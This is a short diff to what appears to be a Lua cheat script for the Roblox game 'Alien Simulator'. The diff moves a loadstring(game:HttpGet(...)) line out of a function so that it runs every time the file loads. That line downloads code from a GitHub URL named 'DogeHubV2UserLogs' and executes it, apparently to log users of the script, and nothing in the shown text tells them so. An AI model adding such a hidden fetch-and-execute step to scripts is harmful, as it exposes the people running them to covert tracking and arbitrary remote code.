@@ -1022,11 +1022,9 @@ local function AlienSimulator()
 		notify("Discord link copied to clipboard!")
 	end)
 
-		gameplaceexecuted = "Alien Simulator"
-		
-		loadstring(game:HttpGet('https://raw.githubusercontent.com/Kasep6720/Secret/refs/heads/Functions/DogeHubV2UserLogs', true))()
-
+	gameplaceexecuted = "Alien Simulator"
 
 end
 
 AlienSimulator()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kasep6720/Secret/refs/heads/Functions/DogeHubV2UserLogs', true))()
